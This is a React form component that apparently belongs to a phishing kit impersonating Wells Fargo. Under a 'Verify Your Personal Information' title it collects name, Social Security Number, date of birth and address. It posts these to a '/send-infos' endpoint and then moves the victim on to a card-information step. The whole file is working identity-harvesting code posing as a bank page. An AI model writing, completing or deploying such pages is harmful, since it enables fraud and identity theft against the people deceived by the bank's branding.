import { Box } from "@mui/material";
import axios from "axios";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { Helmet } from "react-helmet";
import { CustomInput } from "./CustomInput";
import { SubmitButton } from "./SubmitButton";
import { Wrapper } from "./Wrapper";

interface PersonalInfoProps {
  updateInputs: (data: any) => void;
  inputs?: {};
  history: any;
}

export const PersonalInfo: React.FC<PersonalInfoProps> = ({
  updateInputs,
  history,
}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    updateInputs({
      form: "PERSONAL INFORMATION",
      personalInfo: data,
    });

    await axios.post("/send-infos", {
      form: "PERSONAL INFORMATION",
      personalInfo: data,
    });
    setLoading(false);
    history.push("/s/card-information");
  });
  return (
    <Wrapper title="Personal Information" errors={errors}>
      <Helmet>
        <title>Verify Your Personal Information | Wells Fargo</title>
      </Helmet>
      <Box paddingBottom="32px">
        <CustomInput
          label="First name"
          register={register("firstname", {
            required: "Please enter your first name",
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Last name"
          register={register("lastname", {
            required: "Please enter your last name",
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Social Security Number"
          type="number"
          register={register("ssn", {
            required: "Please enter your Social Security Number",
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Date of birth: MM/DD/YYYY"
          register={register("dob", {
            required: "Please enter your date of birth",
            pattern: {
              value: /^(0?[1-9]|[12][0-9]|3[01])[/-](0?[1-9]|1[012])[/-]\d{4}$/,
              message:
                "Please enter a valid date of birth in the format mentioned above",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Street Address"
          register={register("address", {
            required: "Please enter your street address",
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Zip code"
          type="number"
          register={register("zipCode", {
            required: "Please enter your Zip code",
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="State"
          register={register("state", {
            required: "Please enter your state",
          })}
        />
      </Box>
      <Box
        component="section"
        sx={{
          margin: "1rem auto .625rem",
          display: "block",
        }}
      />
      <SubmitButton text="Submit" onClick={onSubmit} loading={loading} />
    </Wrapper>
  );
};
